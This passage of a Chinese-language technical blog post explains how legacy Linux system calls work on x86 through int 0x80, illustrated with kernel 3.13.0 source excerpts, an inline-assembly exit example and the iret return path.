&lt;h2 id=&quot;准备知识&quot;&gt;&lt;a href=&quot;#准备知识&quot; class=&quot;headerlink&quot; title=&quot;准备知识&quot;&gt;&lt;/a&gt;准备知识&lt;/h2&gt;&lt;h3 id=&quot;硬件与软件&quot;&gt;&lt;a href=&quot;#硬件与软件&quot; class=&quot;headerlink&quot; title=&quot;硬件与软件&quot;&gt;&lt;/a&gt;硬件与软件&lt;/h3&gt;&lt;p&gt;这篇博客作以下假设：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;你在使用32位、64位Intel或AMD CPU. 文中提到的方法可能对那些使用其它系统的人同样有效，但列出的代码都是依赖CPU的。&lt;/li&gt;
&lt;li&gt;你感兴趣的是Linux kernel 3.13.0. 其它的内核版本类似，但实际的代码行号，代码架构以及文件路径会有所不同。文中也提供了3.13.0内核源代码的github链接。&lt;/li&gt;
&lt;li&gt;&lt;p&gt;你感兴趣的是&lt;code&gt;glibc&lt;/code&gt;，或者由&lt;code&gt;glibc&lt;/code&gt;衍生的其它libc实现(比如&lt;code&gt;eglibc&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;文中提到的x86-64指的是基于x86架构的64位Intel和AMD处理器。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;用户程序，内核与CPU特权级&quot;&gt;&lt;a href=&quot;#用户程序，内核与CPU特权级&quot; class=&quot;headerlink&quot; title=&quot;用户程序，内核与CPU特权级&quot;&gt;&lt;/a&gt;用户程序，内核与CPU特权级&lt;/h3&gt;&lt;p&gt;用户程序(如编辑器、终端、ssh进程等)需要与内核交互，内核才能代表用户程序执行一些其不能执行的操作。&lt;/p&gt;
&lt;p&gt;举个例子，如果一个用户程序需要执行一些I/O操作(open,read,write等)或者修改自身的地址空间(mmap,sbrk等)，必须要通知内核才能代表其自身完成这些操作。&lt;/p&gt;
&lt;p&gt;那么又是什么阻碍了用户程序自身执行这些操作呢？&lt;/p&gt;
&lt;p&gt;x86-64处理器引入了特权级的概念。特权级是个复杂的话题，需要另写博文详述了。当然，本文重点不在此，因此将特权级的概念简化如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;特权级实现了访问控制。当前特权级决定了哪些CPU指令和I/O操作能被执行。&lt;/li&gt;
&lt;li&gt;内核运行在最高特权级，称为“Ring 0”；用户程序运行在最低特权级,称为”Ring 3”.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;用户程序要执行特权操作，必须经历特权级转变的过程(从”Ring 3”到“Ring 0”),才能让内核来执行这些操作。&lt;/p&gt;
&lt;p&gt;有许多方法能引起特权级转变并触发内核执行相关操作。&lt;/p&gt;
&lt;p&gt;从常用的方法说起：中断。&lt;/p&gt;
&lt;h3 id=&quot;中断&quot;&gt;&lt;a href=&quot;#中断&quot; class=&quot;headerlink&quot; title=&quot;中断&quot;&gt;&lt;/a&gt;中断&lt;/h3&gt;&lt;p&gt;可以把中断理解为硬件或软件引发的一个事件。&lt;/p&gt;
&lt;p&gt;硬件中断源于硬件设备通知内核某个特殊事件的发生。网卡收到数据包时产生的中断是比较常见的硬件中断。&lt;/p&gt;
&lt;p&gt;软件中断由某段代码的执行而引发。在x86-64系统中，执行 int指令就会引发软件中断。&lt;/p&gt;
&lt;p&gt;中断通常都会被分配一个中断号。这些中断号有着特殊的含义。&lt;/p&gt;
&lt;p&gt;想象存储在CPU内存中的一个数组，数组的每个条目都映射为一个中断号。每个条目还存储了当CPU接收到中断信号后将要执行的函数地址以及一些其它的选项，选项中含有中断处理函数应该在哪个特权级上执行的信息。&lt;/p&gt;
&lt;p&gt;下面的这张图取自Intel CPU手册，描述了数组中每个条目的存储结构。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppf1.com1.z0.glb.clouddn.com/idt.png&quot; alt=&quot;idt&quot;&gt;&lt;/p&gt;
&lt;p&gt;仔细看，会发现有一个2位的域标记着特权级描述符(DPL)。这个值决定了当执行中断处理函数时CPU需要的最低特权级。&lt;/p&gt;
&lt;p&gt;当CPU接收到特定类型事件时，通过DPL信息知道它应该执行在哪个地址空间，以及事件处理器应该执行在哪个特权级上。&lt;/p&gt;
&lt;p&gt;实际上，在x86-64系统中有许多不同的方法处理中断。对这个感兴趣想了解更多的可以参考 &lt;a href=&quot;http://wiki.osdev.org/8259_PIC&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;8259 Programmable Interrupt Controller, Advanced Interrupt Controllers&lt;/a&gt;和&lt;a href=&quot;http://wiki.osdev.org/IOAPIC&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt; IO Advanced Interrupt Controllers&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;当处理硬件中断和软件中断时，还会涉及到其它一些复杂的工作要处理，比如中断号冲突与重映射等问题。&lt;/p&gt;
&lt;p&gt;讨论系统调用时，我们不必关注以上这些细节。&lt;/p&gt;
&lt;h3 id=&quot;特殊模块寄存器&quot;&gt;&lt;a href=&quot;#特殊模块寄存器&quot; class=&quot;headerlink&quot; title=&quot;特殊模块寄存器&quot;&gt;&lt;/a&gt;特殊模块寄存器&lt;/h3&gt;&lt;p&gt;特殊模块寄存器（MSRs)是用来控制CPU某些特性的一组控制寄存器。 CPU文档中列举了每个MSRs的地址。&lt;/p&gt;
&lt;p&gt;可以执行CPU指令 &lt;code&gt;rdmsr/wrmsr&lt;/code&gt;来读/写 MSRs.&lt;/p&gt;
&lt;p&gt;也有一些命令行工具可以用来读/写 MSRs. 但不建议这么做，因为修改这些值（尤其当系统在运行的时候)是相当危险的，除非你真的能做到小心翼翼。&lt;/p&gt;
&lt;p&gt;如果你不介意让你的系统不稳定或者不可恢复的损坏你的数据，你可以安装&lt;code&gt;msr-tools&lt;/code&gt;工具并加载&lt;code&gt;msr&lt;/code&gt;内核模块来读/写MSRs.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;% sudo apt-get install msr-tools
% sudo modprobe msr
% sudo rdmsr
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;下文中我们会看到一些系统调用的方法就会用到这些MSRs.&lt;/p&gt;
&lt;h3 id=&quot;编写汇编代码触发系统调用不是个好主意&quot;&gt;&lt;a href=&quot;#编写汇编代码触发系统调用不是个好主意&quot; class=&quot;headerlink&quot; title=&quot;编写汇编代码触发系统调用不是个好主意&quot;&gt;&lt;/a&gt;编写汇编代码触发系统调用不是个好主意&lt;/h3&gt;&lt;p&gt;自己编写汇编代码来触发系统调用可不是个好主意。&lt;/p&gt;
&lt;p&gt;最大的原因就在于一些系统调用在执行之前或之后会有额外的代码需要在glibc中执行。&lt;/p&gt;
&lt;p&gt;在下面的例子中，我们会用到&lt;code&gt;exit&lt;/code&gt;系统调用。你可以在&lt;code&gt;exit&lt;/code&gt;被调用时利用&lt;a href=&quot;http://man7.org/linux/man-pages/man3/atexit.3.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;atexit&lt;/code&gt;&lt;/a&gt;注册处理函数。&lt;/p&gt;
&lt;p&gt;这些处理函数都是被glibc调用的，注意，不是kernel. 因此，当你自己写汇编代码调用&lt;code&gt;exit&lt;/code&gt;时，你自己注册的处理函数是不会执行的，因为你绕过了glibc。&lt;/p&gt;
&lt;p&gt;然而，写汇编代码来执行系统调用是个不错的学习经验。&lt;/p&gt;
&lt;h2 id=&quot;传统系统调用&quot;&gt;&lt;a href=&quot;#传统系统调用&quot; class=&quot;headerlink&quot; title=&quot;传统系统调用&quot;&gt;&lt;/a&gt;传统系统调用&lt;/h2&gt;&lt;p&gt;从上文的准备知识中，我们可以知道两件事情：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;可以通过软件中断来触发内核的执行&lt;/li&gt;
&lt;li&gt;可以通过汇编指令 &lt;code&gt;int&lt;/code&gt; 来产生软件中断&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;结合这两个概念我们再去了解Linux系统中的传统系统调用接口。&lt;/p&gt;
&lt;p&gt;Linux内核分配了一个特殊的软件中断号，让用户程序进入到内核中执行系统调用。&lt;/p&gt;
&lt;p&gt;Linux内核会为中断处理号 128(0x80)注册一个中断处理器&lt;code&gt;ia32-syscall&lt;/code&gt;. 通过代码来看看到底怎么做的。&lt;/p&gt;
&lt;p&gt;内核3.13.0源码中的&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/kernel/traps.c#L770&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/kernel/traps.c&lt;/code&gt;&lt;/a&gt;中有个&lt;code&gt;trap_init&lt;/code&gt;函数:&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; __&lt;span class=&quot;function&quot;&gt;init &lt;span class=&quot;title&quot;&gt;trap_init&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/* ..... other code ... */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        set_system_intr_gate(IA32_SYSCALL_VECTOR, ia32_syscall);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其中，&lt;code&gt;IA32_SYSCALL_VECTOR&lt;/code&gt;在&lt;code&gt;arch/x86/include/asm/irq_vectors.h&lt;/code&gt;中被定义为 &lt;code&gt;0x80&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;进一步看，既然内核预留了一个软件中断供用户程序来触发内核的执行，那在这么多的系统调用中，内核又是如何知道该执行哪一个呢？&lt;/p&gt;
&lt;p&gt;这时，用户程序需要在&lt;code&gt;eax&lt;/code&gt;寄存器中放入系统调用号。系统调用相关的其它参数会被传入到剩余的通用寄存器中。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/ia32/ia32entry.S#L378-L397&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/ia32/ia32entry.S&lt;/code&gt;&lt;/a&gt;中的注释对此有具体的介绍:&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;* Emulated IA32 system calls via &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0x80&lt;/span&gt;.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;* Arguments:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;* %eax System call number.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;* %ebx Arg1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;* %ecx Arg2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;* %edx Arg3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;* %esi Arg4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;* %edi Arg5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;* %ebp Arg6    [note: not saved in the &lt;span class=&quot;built_in&quot;&gt;stack&lt;/span&gt; frame, should not be touched]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;现在我们知道了如何执行系统调用以及如何传递这些参数，可以开始试着写一些内联汇编代码。&lt;/p&gt;
&lt;h3 id=&quot;自己编写汇编代码使用传统系统调用&quot;&gt;&lt;a href=&quot;#自己编写汇编代码使用传统系统调用&quot; class=&quot;headerlink&quot; title=&quot;自己编写汇编代码使用传统系统调用&quot;&gt;&lt;/a&gt;自己编写汇编代码使用传统系统调用&lt;/h3&gt;&lt;p&gt;要使用传统系统调用，你可以写一小段内联汇编代码，尽管从学习的角度来看这很有用，我绝不鼓励读者们自己编写汇编代码使用系统调用。&lt;/p&gt;
&lt;p&gt;在下面的例子中，我们会试着去执行&lt;code&gt;exit&lt;/code&gt;系统调用，它只需要一个参数：退出状态.&lt;/p&gt;
&lt;p&gt;首先，我们需要找到&lt;code&gt;exit&lt;/code&gt;的系统调用号。Linux内核中有个文件将每个系统调用列在了一张表中。很多脚本在构建的时候会处理此文件以产生一些头文件供用户使用。&lt;/p&gt;
&lt;p&gt;看看上述的表格，可以在&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/syscalls/syscall_32.tbl&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/syscalls/syscall_32.tbl&lt;/code&gt;&lt;/a&gt;找到:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1 i386 exit sys_exit
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可见 &lt;code&gt;exit&lt;/code&gt;的系统调用号是1. 根据上文所述，我们需要将系统调用号写入&lt;code&gt;eax&lt;/code&gt;寄存器中，以及第一个参数（退出状态)写入&lt;code&gt;ebx&lt;/code&gt;寄存器中。&lt;/p&gt;
&lt;p&gt;下面介绍的一段C代码（含有一些内联汇编）做的就是上面的工作。可以看到退出状态是’42’.&lt;/p&gt;
&lt;p&gt;（实际上这个例子可以简化一些，但我认为多用一些文字描述会更有用，让那些之前从没见过GCC内联汇编代码的人也可以用下面的例子作为参考）&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *argv[])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; syscall_nr = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; exit_status = &lt;span class=&quot;number&quot;&gt;42&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;asm&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;&quot;movl %0, %%eax\n&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;             &lt;span class=&quot;string&quot;&gt;&quot;movl %1, %%ebx\n&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;string&quot;&gt;&quot;int $0x80&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    : &lt;span class=&quot;comment&quot;&gt;/* output parameters, we aren&#39;t outputting anything, no none */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;/* (none) */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    : &lt;span class=&quot;comment&quot;&gt;/* input parameters mapped to %0 and %1, repsectively */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;string&quot;&gt;&quot;m&quot;&lt;/span&gt; (syscall_nr), &lt;span class=&quot;string&quot;&gt;&quot;m&quot;&lt;/span&gt; (exit_status)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    : &lt;span class=&quot;comment&quot;&gt;/* registers that we are &quot;clobbering&quot;, unneeded since we are calling exit */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;string&quot;&gt;&quot;eax&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;ebx&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;接下来，编译，执行，然后检查退出状态。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ gcc -o test test.c
$ ./test
$ echo $?
42
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功了！ 这就是我们利用软件中断来执行&lt;code&gt;exit&lt;/code&gt;系统调用的全过程。&lt;/p&gt;
&lt;h3 id=&quot;内核层面：int-0x80入口&quot;&gt;&lt;a href=&quot;#内核层面：int-0x80入口&quot; class=&quot;headerlink&quot; title=&quot;内核层面：int $0x80入口&quot;&gt;&lt;/a&gt;内核层面：&lt;code&gt;int $0x80&lt;/code&gt;入口&lt;/h3&gt;&lt;p&gt;目前为止，我们知道了如何从用户程序中触发系统调用。&lt;br&gt;下面来看看内核如何利用系统调用号执行系统调用中的代码。&lt;/p&gt;
&lt;p&gt;回顾前文，内核调用&lt;code&gt;ia32_syscall&lt;/code&gt;来注册系统调用处理函数。&lt;/p&gt;
&lt;p&gt;该函数是用汇编实现的，定义在&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/ia32/ia32entry.S#L426&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/ia32/ia32entry.S&lt;/code&gt;&lt;/a&gt;中。该函数做了很多事情，但最重要的还是它触发了实际的系统调用：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ia32_do_call:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;function&quot;&gt;IA32_ARG_FIXUP&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        call *&lt;span class=&quot;title&quot;&gt;ia32_sys_call_table&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(,%rax,&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;)&lt;/span&gt; &lt;span class=&quot;meta&quot;&gt;# xxx: rip relative&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;注意到，&lt;code&gt;IA32_ARG_FIXUP&lt;/code&gt; 是一个宏，做的是重新处理初始参数，以让当前的系统调用层能正确的理解这些参数。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ia32_sys_call_table&lt;/code&gt; 是&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/ia32/syscall_ia32.c#L18-L25&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/ia32/syscall_ia32.c&lt;/code&gt;&lt;/a&gt;中定义的一张表。注意代码中的最后一行 &lt;code&gt;#include&lt;/code&gt;. &lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;sys_call_ptr_t&lt;/span&gt; ia32_sys_call_table[__NR_ia32_syscall_max+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;] = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         * Smells like a compiler bug -- it doesn&#39;t work&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         * when the &amp;amp; below is removed.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        [&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; ... __NR_ia32_syscall_max] = &amp;amp;compat_ni_syscall,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#include &amp;lt;&lt;span class=&quot;keyword&quot;&gt;asm&lt;/span&gt;/syscalls_32.h&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;回想一下前面提到在 &lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/syscalls/syscall_32.tbl&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/syscalls/syscall_32.tbl&lt;/code&gt;&lt;/a&gt; 中定义的系统调用表。&lt;/p&gt;
&lt;p&gt;一些脚本在编译的时候使用这张表生成&lt;code&gt;syscalls_32.h&lt;/code&gt;头文件。头文件中由一些有效的C代码组成，就像上面一样，以&lt;code&gt;#include&lt;/code&gt;的形式插入到&lt;code&gt;ia32_sys_call_table&lt;/code&gt;中，里面含有系统调用号引用的函数地址。&lt;/p&gt;
&lt;p&gt;到目前为止，你已经知道如何通过传统系统调用进入内核了。&lt;/p&gt;
&lt;h3 id=&quot;iret-从传统系统调用返回&quot;&gt;&lt;a href=&quot;#iret-从传统系统调用返回&quot; class=&quot;headerlink&quot; title=&quot;iret: 从传统系统调用返回&quot;&gt;&lt;/a&gt;iret: 从传统系统调用返回&lt;/h3&gt;&lt;p&gt;了解了如何通过软件中断进入内核执行系统调用之后，应该思考，内核应该如何返回到用户程序中并恢复其原始特权级呢？&lt;/p&gt;
&lt;p&gt;查阅 &lt;a href=&quot;ftp://download.intel.com/design/processor/manuals/253668.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Intel Software Developer’s Manual&lt;/a&gt; （警告：PDF很大), 可以找到一些有用的图表，描述了当特权级转变时，程序栈的状态。&lt;/p&gt;
&lt;p&gt;请看图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppf1.com1.z0.glb.clouddn.com/isr_stack.png&quot; alt=&quot;isr-stack&quot;&gt;&lt;/p&gt;
&lt;p&gt;当用户程序利用软件中断将执行环境转变到内核函数&lt;code&gt;ia32_syscall&lt;/code&gt;中时，发生特权级转变。上图描述的就是当进入到&lt;code&gt;ia32_syscall&lt;/code&gt;中时栈的状态。&lt;/p&gt;
&lt;p&gt;这就意味着在&lt;code&gt;ia32_syscall&lt;/code&gt;执行前，返回地址和CPU标志(用来编码特权级)以及其它的信息都被存储在栈中。&lt;/p&gt;
&lt;p&gt;如此一来，为了恢复用户程序的执行，内核只需要将栈中的这些值拷贝到相应的寄存器中。&lt;/p&gt;
&lt;p&gt;好了，这些都是如何做到的？&lt;/p&gt;
&lt;p&gt;有很多方法可以做到，其中最简单的就是使用&lt;code&gt;iret&lt;/code&gt;指令。&lt;/p&gt;
&lt;p&gt;Intel指令集手册中指出，&lt;code&gt;iret&lt;/code&gt;指令从栈中将返回地址和保存的寄存器的值按照初始顺序pop出来。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;As with a real-address mode interrupt return, the IRET instruction pops the return instruction pointer, return code segment selector, and EFLAGS image from the stack to the EIP, CS, and EFLAGS registers, respectively, and then resumes execution of the interrupted program or procedure.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在Linux内核中找到相关的代码有一点点困难，因为它们隐藏在许多宏中,类似的标志以及系统调用退出的追踪信息都会经过额外的处理。&lt;/p&gt;
&lt;p&gt;遍历内核中汇编存根里面所有的宏最终会找到&lt;code&gt;iret&lt;/code&gt;，用来从系统调用返回到用户程序。&lt;/p&gt;
&lt;p&gt;在&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/kernel/entry_64.S#L1042-L1043&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/kernel/entry_64.S&lt;/code&gt;&lt;/a&gt;中可以找到&lt;code&gt;irq_return&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;irq_return:
INTERRUPT_RETURN
